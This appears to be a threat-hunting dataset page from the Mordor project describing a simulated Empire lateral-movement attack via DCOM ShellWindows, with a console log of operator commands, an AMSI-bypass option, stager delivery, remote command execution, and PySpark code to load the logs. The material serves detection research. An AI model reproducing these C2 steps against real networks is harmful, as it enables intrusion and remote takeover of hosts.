# Empire DCOM ShellWindows

## Metadata


|                       |    |
|:----------------------|:---|
| id                    | SDWIN-190518211052 |
| author                | Roberto Rodriguez @Cyb3rWard0g |
| creation date         | 2019/05/18 |
| platform              | Windows |
| Tactic(s)             | ['[TA0002](https://attack.mitre.org/tactics/TA0002)', '[TA0008](https://attack.mitre.org/tactics/TA0008)'] |
| Technique(s)          | ['[T1021.003](https://attack.mitre.org/techniques/T1021/003)'] |
| Simulaton Environment | Mordor shire |
| Simulation Scripts    | ['https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1'] |
| Dataset Host           | ['https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/host/mpire_dcom_shellwindows_stager.zip'] |
| Dataset Network           | ['https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/network/empire_dcom_shellwindows_stager.zip'] |
| References        | None |

## Dataset Description
This dataset represents adversaries executing commands on remote hosts via DCOM ShellWindows COM Method.

## Adversary View
```
(Empire: agents) > agents

[*] Active agents:

Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
A7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\pgustavo      powershell         5904   5/0.0    2020-09-18 17:07:59  http            

(Empire: agents) > interact A7BWPR32
(Empire: A7BWPR32) > usemodule lusemodule lateral_movement/invoke_dcom
(Empire: powershell/lateral_movement/invoke_dcom) > info

              Name: Invoke-DCOM
            Module: powershell/lateral_movement/invoke_dcom
        NeedsAdmin: False
        OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: False
  OutputExtension: None

Authors:
  @rvrsh3ll

Description:
  Execute a stager or command on remote hosts using DCOM.

Options:

  Name             Required    Value                     Description
  ----             --------    -------                   -----------
  Agent            True        A7BWPR32                  Agent to run module on.                 
  CredID           False                                 CredID from the store to use.           
  ComputerName     True        WORKSTATION6              Host[s] to execute the stager on, comma 
                                                        separated.                              
  Method           True        ShellWindows              COM method to use. MMC20.Application,She
                                                        llWindows,ShellBrowserWindow,ExcelDDE   
  Listener         False       http                      Listener to use.                        
  Command          False                                 Custom command to run.                  
  Obfuscate        False       False                     Switch. Obfuscate the launcher          
                                                        powershell code, uses the               
                                                        ObfuscateCommand for obfuscation types. 
                                                        For powershell only.                    
  ObfuscateCommand False       Token\All\1               The Invoke-Obfuscation command to use.  
                                                        Only used if Obfuscate switch is True.  
                                                        For powershell only.                    
  AMSIBypass       False       True                      Include mattifestation's AMSI Bypass in 
                                                        the stager code.                        
  AMSIBypass2      False       False                     Include Tal Liberman's AMSI Bypass in   
                                                        the stager code.                        
  UserAgent        False       default                   User-agent string to use for the staging
                                                        request (default, none, or other).      
  Proxy            False       default                   Proxy to use for request (default, none,
                                                        or other).                              
  ProxyCreds       False       default                   Proxy credentials                       
                                                        ([domain\]username:password) to use for 
                                                        request (default, none, or other).      

(Empire: powershell/lateral_movement/invoke_dcom) > execute
[*] Tasked A7BWPR32 to run TASK_CMD_WAIT
[*] Agent A7BWPR32 tasked with task ID 6
[*] Tasked agent A7BWPR32 to run module powershell/lateral_movement/invoke_dcom
(Empire: powershell/lateral_movement/invoke_dcom) > 
Completed

[*] Sending POWERSHELL stager (stage 1) to 172.18.39.6
[*] New agent HBEW9G1D checked in
[+] Initial agent HBEW9G1D from 172.18.39.6 now active (Slack)
[*] Sending agent (stage 2) to HBEW9G1D at 172.18.39.6

(Empire: powershell/lateral_movement/invoke_dcom) > agents

[*] Active agents:

Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
A7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\pgustavo      powershell         5904   5/0.0    2020-09-18 17:08:46  http            
HBEW9G1D ps 172.18.39.6     WORKSTATION6      THESHIRE\sbeavers       powershell         6036   5/0.0    2020-09-18 17:08:47  http            

(Empire: agents) > interact HBEW9G1D
(Empire: HBEW9G1D) > shell whoami
[*] Tasked HBEW9G1D to run TASK_SHELL
[*] Agent HBEW9G1D tasked with task ID 1
(Empire: HBEW9G1D) > 
theshire\sbeavers

..Command execution completed.

(Empire: HBEW9G1D) >
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/host/mpire_dcom_shellwindows_stager.zip"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        